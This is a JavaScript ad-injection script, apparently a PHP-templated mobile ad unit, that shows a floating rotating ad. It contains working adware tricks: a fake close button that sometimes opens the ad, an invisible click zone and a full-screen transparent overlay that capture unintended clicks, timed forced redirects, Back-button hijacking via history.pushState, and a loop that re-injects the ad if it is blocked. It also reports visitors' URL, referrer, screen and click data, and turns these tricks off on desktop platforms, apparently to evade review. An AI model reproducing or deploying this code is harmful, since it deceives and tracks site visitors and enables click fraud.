;(function() {
    
    var key = Math.random().toString(36).substr(Math.floor(Math.random()*6+2));
    
    if (window[key] != undefined) return;

    var lh = window[key] = {};
    
    lh.$ = function(name)
    {
        if(name.substr(0,1)=='.')
        {
            return document.getElementsByClassName( name.substr(1) );
        }
        else if(name.substr(0,1)=='#')
        {
            return document.getElementById( name.substr(1) );
        }
        else
        {
            return document.getElementsByTagName('head');
        }
    };
    //cookie
    lh.getCo = function(name)
    {
        var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");

        if(arr=document.cookie.match(reg)){
            return unescape(arr[2]);
        }else{
            return '';
        }
    };
    lh.setCo = function(name, value, second)
    {
        var exp = new Date();
        exp.setTime( exp.getTime() + second*1000);
        document.cookie = name + "=" + escape (value) + ";expires=" + exp.toGMTString();
    };
    lh.isCo = function()
    {
        lh.setCo('iscookie', '1');
        if( '1'!=lh.getCo('iscookie')){
            return false;
        }else{
            return true;
        }
    };
    //class
    lh.Acla = function(name, classname)
    {
        var ele = lh.$(name);

        if(name.substr(0,1)=='.')
        {
            for(index in ele)
            {
                if((parseInt(index) || index=='0'))
                {
                    if(!ele[index].className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
                    {
                        ele[index].className = ele[index].className+" "+classname;
                    }
                }
            }
        }
        if(name.substr(0,1)=='#')
        {
            if(!ele.className.match( new RegExp( "(\\s|^)"+classname+"(\\s|$)") ))
            {
                ele.className = ele.className+" "+classname;
            }
        }
    };
    
    lh.Rcla = function(name, classname)
    {
        var ele = lh.$(name);

        if(name.substr(0,1)=='.')
        {
            for(index in ele)
            {
                if((parseInt(index) || index=='0'))
                {
                    if(ele[index].className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
                    {
                        ele[index].className = ele[index].className.replace( new RegExp( "(\\s|^)" + classname + "(\\s|$)" ), "");
                    }
                }
            }
        }
        if(name.substr(0,1)=='#')
        {
            if(ele.className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
            {
                ele.className = ele.className.replace( new RegExp( "(\\s|^)" + classname + "(\\s|$)" ), "");
            }
        }
    };
    
    //加密
    lh.encode = function(k, e)
    {
        var t="";
        var n,r,i,s,o,u,a;
        var f=0;
        while(f<e.length)
        {
            n=e.charCodeAt(f++);
            r=e.charCodeAt(f++);
            i=e.charCodeAt(f++);
            s=n>>2;
            o=(n&3)<<4|r>>4;
            u=(r&15)<<2|i>>6;
            a=i&63;
            if(isNaN(r)){
                u=a=64;
            }else if(isNaN(i)){
                a=64;
            }
            t=t+k.charAt(s)+k.charAt(o)+k.charAt(u)+k.charAt(a);
        }
        return t;
    };
    
    //创建
    lh.CScript = function(url)
    {
        var script = document.createElement('script');
        script.async = true;
        script.src = url;
        document.body.appendChild(script);
    };

    lh.Aget = function(url, id)
    {
        url = url+'?dt';
        var ajax = new XMLHttpRequest();
        ajax.open('get', url.replace(/\.[a-zA-Z]+\?dt/, '.txt')+'?123');
        ajax.send();
        ajax.onreadystatechange = function () {
            if (ajax.readyState==4 &&ajax.status==200) {
                lh.$('#'+id).style.background = 'url("data:image/jpg;base64,'+ajax.responseText+'")  no-repeat';
            }
        }
    };

    //样式
    lh.Sstyle = function(D)
    {   
        var size = 28;

        var hid_height = D.hid_height;

        var label = 'body{margin: 0px;}';
        if(D.position==1){
            var label = label + '.l'+key+' .h'+key+' .c'+key+'{ right: 0px; }';
            var label = label + '.l'+key+' .d'+key+'{left: 10px;}';
            var label = label + '.l'+key+' .h'+key+'{left: 10px;}';
        }
        if(D.position==2){
            var label = label + '.l'+key+' .h'+key+' .c'+key+'{ left: 0px; }';
            var label = label + '.l'+key+' .d'+key+'{right: 10px;}';
            var label = label + '.l'+key+' .h'+key+'{right: 10px;}';
        }

        var label = label + '.hi'+key+'{display: none;}';
        var label = label + '.l'+key+'{overflow: initial; }';
        var label = label + '.l'+key+' *{-webkit-user-select: none;-moz-user-select: none;-webkit-user-select:none;-o-user-select:none;user-select:none;-webkit-tap-highlight-color: transparent;-webkit-tap-highlight-color:rgba(0,0,0,0);}';
        var label = label + '.l'+key+' .d'+key+'{position: fixed; z-index: '+D.index+'; width: '+hid_height+'%; height: '+size+'vw; top: '+D.icons_top+'%;  background: none;}';
        var label = label + '.l'+key+' .s'+key+'{position: fixed; z-index: '+D.index+'; width: 100%; height: 100%; top: 0px; left:0px; background: none;}';
        var label = label + '.l'+key+' .h'+key+'{position: fixed; z-index: '+D.index+'; width: '+size+'%; height: '+size+'vw; top: '+D.icons_top+'%; overflow: inherit; overflow: initial;}';
        var label = label + '.l'+key+' .h'+key+' .m'+key+' .img'+key+'{display: none; width: 100%; height: 100%; background-size: 100% !important; pointer-events: none;}';
        var label = label + '.l'+key+' .h'+key+' .m'+key+' .t'+key+'{display: block;}';

        //样式
        if(D.style_type==1){
            var label = label + '.l'+key+' .h'+key+' .m'+key+'{position: relative; width:100%; height: 100%; box-sizing: border-box; border: 3px solid red; border-image: -webkit-linear-gradient(#ff0000,#0000ff) 30 30; border-image: linear-gradient(#ff0000,#0000ff) 30 30; }';
            var label = label + '.l'+key+' .h'+key+' .c'+key+'{line-height: 14px; width: 14px; height: 14px; text-align: center; background: #a9eccd; opacity:0.5; color:#000; top: -14px; position: absolute; z-index: '+D.index+'; font-size: 12px;}';
        }else if(D.style_type==2){
            var label = label + '.l'+key+' .h'+key+' .m'+key+'{position: relative; width:100%; height: 100%; box-sizing: border-box; border: 2px solid red; border-image: -webkit-linear-gradient(#035dff,#5eff0c) 30 30; border-image: linear-gradient(#035dff,#5eff0c) 30 30 }';
            var label = label + '.l'+key+' .h'+key+' .c'+key+'{line-height: 15px; width: 15px; height: 15px; text-align: center; background: #80928a; opacity:0.5; color:#fff; top: -14px; position: absolute; z-index: '+D.index+'; font-size: 12px; border-radius: 15px;}';
        }

        //动画
        if(D.js_effects=='1')
        {
            var label = label + '.l'+key+' .h'+key+' .m'+key+'{ -webkit-animation: a'+key+' 4s  linear infinite backwards; animation: a'+key+' 4s linear  infinite backwards;}';
            var label = label + '@keyframes a'+key+' { 0% {transform: rotate(0deg) scale(1,1);} 20% {transform: rotate(30deg) scale(1.5,1.5);} 40% {transform: scale(1,1);} 60% {transform: rotate(-30deg) scale(1.5,1.5);} 80% {transform: rotate(0deg) scale(1,1);} }';
            var label = label + '@-webkit-keyframes a'+key+' { 0% {transform: rotate(0deg) scale(1,1);} 20% {transform: rotate(30deg) scale(1.5,1.5);} 40% {transform: scale(1,1);} 60% {transform: rotate(-30deg) scale(1.5,1.5);} 80% {transform: rotate(0deg) scale(1,1);} }';
        }
        var style = document.createElement('style');
        style.type = 'text/css';
        style.innerHTML = label;
        document.head.appendChild(style);

        lh.Shtml(D);
    };

    //标签
    lh.Shtml = function(D)
    {
        var label = '';

        var label = label + '<div class="d'+key+'" id="d'+key+'"></div>';
        var label = label + '<div class="s'+key+' hi'+key+'" id="s'+key+'"></div>';
        var label = label + '<div class="h'+key+'" id="h'+key+'">';
        var label = label + '<div class="c'+key+'" id="c'+key+'">╳</div>';
        var label = label + '<div class="m'+key+'" id="m'+key+'">';
        for(index in D.matter)
        {
            if(index==0){
                var label = label + '<div class="img'+key+' t'+key+'" id="img'+key+index+'"></div>';
                lh.Aget(D.murl+'/'+D.matter[index].path, 'img'+key+index+'');
            }else{
                var label = label + '<div class="img'+key+'" id="img'+key+index+'"></div>';
            }
        }
        var label = label + '</div>';
        var label = label + '</div>';

        var html = document.createElement('div');
        html.className = 'l'+key+'';
        html.id = 'l'+key+'';
        html.innerHTML = label;
        document.body.appendChild(html);

        lh.Sclo(D);
        if(D.adid=='3069'){
            setTimeout(function(){
                lh.click(D);
            }, 700);
        }
        else
        {
            lh.click(D);
        }
        lh.switch(D);

        setInterval(function() {
            lh.Saction(D);
        }, 5000);
            lh.Saction(D);

        //防止屏蔽
        var interval = setInterval(function(){

            var html = lh.$('#l'+key).innerHTML;
            eval('var reg = /class="h'+key+'" id="h'+key+'"/;');
            
            if(reg.test(html)){
                lh.$('#h'+key).style = "";
            }else{
                var x = lh.$('#l'+key);
                x.remove(x.selectedIndex);
                lh.Shtml(D);
                clearInterval(interval);
            }
        }, 1000);
    };

    //切换
    lh.switch = function(D)
    {
        //切换图片
        var index = 1;

        setInterval(function() {
            if(index >= D.matter.length){
                index = 0;
            }
            var background = lh.$('#img'+key+index).style.background;
            if(!background){
                lh.Aget(D.murl+'/'+D.matter[index].path, 'img'+key+index+'');
            }
            setTimeout(function(){
                lh.Rcla('.img'+key, 't'+key);
                lh.Acla('#img'+key+index, 't'+key);
                index++;
            }, 1000);
        }, 10000);
    };
    //动画
    lh.Saction = function(D)
    { 
        if(D.js_effects=='1')
        {
            
        }
    };
    lh.Close = function(D)
    {
        lh.Acla('.l'+key, 'hi'+key);
        setTimeout(function(){
            lh.Rcla('.l'+key, 'hi'+key);
        }, 15000);
    };
    //关闭
    lh.Sclo = function(D)
    {
        lh.$('#c'+key).addEventListener("click", function(){
            
            if(D.false_clo > 0){
                if(parseInt(Math.random() * 100) < D.false_clo){
                    D.type = 'close';
                    lh.open(D);
                    lh.Close(D);
                }else{
                    lh.Close(D);
                }
            }else{
                lh.Close(D);
            }
        });
    };
    //打开
    lh.open = function(D)
    {
        var eve = event || window.event;

        if(lh.isCo())
        {
            var ip = lh.getCo('is_repeat_ip_'+D.adid);
            var ips= new Array();
            ips = ip.split(':');
            var ip_length = ips.length;
        }
        else
        {
            var ip_length = 1;
        }

        var url = D.purl+"/pc?se="+D.string;
        var p = "refso=" + (window.DeviceOrientationEvent ? 1 : 0) + "_" + navigator.platform;
        p = p + "&url=" + encodeURIComponent(document.location);
        p = p + "&source=" + encodeURIComponent(document.referrer);
        p = p + "&screen=" + window.screen.width + "*" + window.screen.height;
        p = p + "&ifrom=" + (self!=top ? 1: 0);
        p = p + "&interval=" + parseInt((((new Date()).getTime())-D.time)/1000);
        p = p + "&history=" + history.length;
        p = p + "&ipnumber=" + ip_length;
        if(eve){
            if(eve.screenX>0 && eve.screenY>0){
                p = p + "&clickp=" + eve.screenX + "*" + eve.screenY;
            }else{
                p = p + "&clickp=0*0";
            }
        }else{
            p = p + "&clickp=0*0";
        }
        p = p + "&link=" + encodeURIComponent(D.link);
        p = p + "&ctype=" + D.type;
        p = p + "&jstime=" + parseInt((new Date()).getTime()/1000);
        url = url + "&"+p+"&t=" + Math.random();

        if(D.type!='skip'){
            lh.setCo('return_13', 1, 120);
        }
        lh.setCo('click_type', '13', 120);

        lh.CScript(url);
    };

    //返回跳转
    lh.rskip = function(D)
    {
        //直返
        if(D.click_return.state=='1' && parseInt(Math.random()*100)<D.click_return.chance)
        {
            if (!!(window.history && history.pushState))
            {
                window.addEventListener("popstate", function(event)
                {
                    var is_click_return = lh.getCo('is_click_return');
                    if(!is_click_return)
                    {
                        lh.setCo('is_click_return', '1', 3);
                        lh.setCo('return_type', 'click_return', 15);
                        D.type = 'click_return';
                        lh.open(D);
                    }
                });
                window.history.pushState(null, null, null);
            }
        }
        //自返
        if(D.own_return.state=='1' && parseInt(Math.random()*100)<D.own_return.chance)
        {
            window.addEventListener('pageshow', function(e)
            {
                if (e.persisted || window.performance && window.performance.navigation.type == 2)
                {
                    var own_return_key = 'own_return_13';
                    var return_type = lh.getCo('return_type');
                    var return_num = parseInt(lh.getCo(own_return_key));

                    if(return_type=='click_return'){
                        if(return_num<=D.own_return.number || D.own_return.number==0)
                        {
                            lh.setCo(own_return_key, return_num+1, 120);
                            D.type = 'own_return';
                            lh.open(D);
                        }
                    }
                }
            }, false);
        }
        //他返
        if(D.other_return.state=='1' && parseInt(Math.random()*100)<D.other_return.chance)
        {
            window.addEventListener('pageshow', function(e)
            {
                if (e.persisted || window.performance && window.performance.navigation.type == 2)
                {
                    var other_return_key = 'other_return_13';
                    var return_type = lh.getCo('return_type');
                    var return_num = parseInt(lh.getCo(other_return_key));

                    if(return_type!='click_return'){
                        if(return_num<=D.other_return.number || D.other_return.number==0)
                        {
                            lh.setCo(other_return_key, return_num+1, 120);
                            D.type = 'other_return';
                            lh.open(D);
                        }
                    }
                }
            }, false);
        }
    };

    //强跳转
    lh.skip = function(D)
    {
        //屏蔽直播广告
        if(D.advid!=84 && D.advid!=83){

            //后台设置强跳
            if(parseInt(Math.random() * 100) < D.skip)
            {
                setTimeout(function(){
                    D.type = 'skip';
                    lh.open(D);
                }, 2000);   
            }
            else
            {
                //有设置强跳：每分钟1，4秒跳转
                var Da = new Date();
                var S = Da.getSeconds();
                if(D.skip>0)
                {
                    if(S>=1 && S<=4)
                    {
                        setTimeout(function(){
                            D.type = 'skip';
                            lh.open(D);
                        }, 3000); 
                    }
                }
            }
        }
    };

    //支口令
    lh.zhikl = function(D)
    {
        if(parseInt(Math.random() * 100) < D.zhikl)
        {
            
        }
    };

    //展示
    lh.show = function(D)
    {
        var num = 1;
        if(lh.isCo())
        {
            var ip = lh.getCo('is_repeat_ip_'+D.adid);
            if(ip){
                if(ip.indexOf(D.ip2long)>-1){
                    var num = 5;
                }else{
                    ip = ip+':'+D.ip2long;
                    lh.setCo('is_repeat_ip_'+D.adid, ip, D.dis_time);
                }
            }else{
                ip = D.ip2long;
                lh.setCo('is_repeat_ip_'+D.adid, ip, D.dis_time);
            }
        }
       
        if(parseInt(Math.random() * 100) < (100/num)){
            var url = D.purl+"/pv?se="+D.string;
            url = url + "&refso=" + (window.DeviceOrientationEvent ? 1 : 0)+"_"+navigator.platform+"_"+history.length;
            url = url + "&url=" + encodeURIComponent(document.location);
            url = url + "&source=" + encodeURIComponent(document.referrer);
            url = url + "&screen=" + window.screen.width + "*" + window.screen.height;
            url = url + "&n="+num;
            url = url + "&ip=1";
            url = url + "&ifrom=1";
            url = url + "&time=" + Math.random();

            lh.CScript(url);
        }
    };
    //强点
    lh.ComCli = function(D)
    {
        //支持cookie
        if(window.navigator.cookieEnabled)
        {
            if(parseInt(Math.random() * 100) < D.com_cha)
            {
                var com_cli = lh.getCo('com_cli_13');
                if( com_cli!='click' && D.com_cli=='1' )
                {
                    lh.$('#s'+key).addEventListener("click", function(){
                        D.type = 'compel_click';
                        lh.open(D);
                        lh.Acla('.s'+key, 'hi'+key);
                        lh.setCo('com_cli_13', 'click', D.com_cli_inter*3600);
                    });
                    //延迟10秒出现强点
                    setTimeout(function(){
                        lh.Rcla('.s'+key, 'hi'+key);
                    }, 12000)
                }
            }
        }
    };
    //点击
    lh.click = function(D)
    {
        lh.$('#d'+key).addEventListener("click", function(){
            D.type = 'hidden';
            lh.open(D);
        });

        lh.$('#m'+key).addEventListener("click", function(){
            D.type = 'good';
            lh.open(D);
        });
    };

    //是否模拟器
    lh.IsMN = function()
    {
        if(navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0){
            return true;
        }else{
            return false;
        }
    };

    //初始化
    lh.init = function(D)
    {
        //初始化JS参数
        D.user_agent = navigator.userAgent.toLowerCase();
        D.time = (new Date()).getTime();
        D.key = 'ZtKfUjbwiR90dm8BgsX4cQ7T5W6kDCHNYG1oyEzqpxrLlFSJPn3uMevhOaVI2A+/=';

        if(lh.IsMN())
        {
            D.false_clo = -1;
            D.hid_height = -1;
            D.zhikl = -1;
            D.skip = -1;
        }
        //else
        {
            lh.show(D);
            lh.Sstyle(D);
            lh.rskip(D);
            lh.skip(D);
            lh.zhikl(D);
            lh.ComCli(D);

            //如果填写统计代码则添加
            if(D.statis_code && parseInt(Math.random() * 100)<D.statis_code_ratio){
                lh.CScript(D.statis_code);
            }
        }
    };

    lh.Data = {
        size: parseInt("<?php echo $webmasterAd['ad_size']; ?>"),
        matter: JSON.parse('<?php echo json_encode($matter, true); ?>'),
        purl: "<?php echo $purl_domain; ?>",
        murl: "<?php echo $matter_domain; ?>",
        string: "<?php echo $string; ?>",
        rskip_str: "<?php echo $rskip_str; ?>",
        is_check: parseInt("<?php echo $webmasterAd['is_check']; ?>"),
        com_cli: "<?php echo $webmasterAd['compel_click']; ?>",
        com_cha: parseInt("<?php echo $webmasterAd['compel_chance']; ?>"),
        com_cli_inter: parseInt("<?php echo $webmasterAd['compel_interval']; ?>"),
        icons_top: parseInt("<?php echo $webmasterAd['icons_top']; ?>"),
        false_clo: parseInt("<?php echo $webmasterAd['false_close']; ?>"),
        hid_height: parseInt("<?php echo $webmasterAd['hid_height']; ?>"),
        zhikl: parseInt("<?php echo $webmasterAd['zhikouling']; ?>"),
        style_type: parseInt("<?php echo $webmasterAd['style_type']; ?>"),
        skip: parseInt("<?php echo $webmasterAd['compel_skip']; ?>"),
        position: parseInt("<?php echo $webmasterAd['position']; ?>"),
        link: "<?php echo $advertiserAd['link']; ?>",
        js_effects: "<?php echo $webmasterAd['js_effects']; ?>",
        adid: "<?php echo $webmasterAd['id']; ?>",
        click_return: JSON.parse('<?php echo $webmasterAd["click_return"]; ?>'),
        own_return: JSON.parse('<?php echo $webmasterAd["own_return"]; ?>'),
        other_return: JSON.parse('<?php echo $webmasterAd["other_return"]; ?>'),
        statis_code: "<?php echo $webmasterAd['statis_code']; ?>",
        statis_code_ratio: parseInt("<?php echo $webmasterAd['statis_code_ratio']; ?>"),
        advid: "<?php echo $advertiserAd['id']; ?>",
        ip2long: "<?php echo ip2long(self::$client['ip']); ?>",
        dis_time: parseInt("<?php echo $distance_time; ?>"),
        time: parseInt("<?php echo $distance_time; ?>"),
        index: "<?php echo $index; ?>",
    };
    
    lh.init(lh.Data);
})();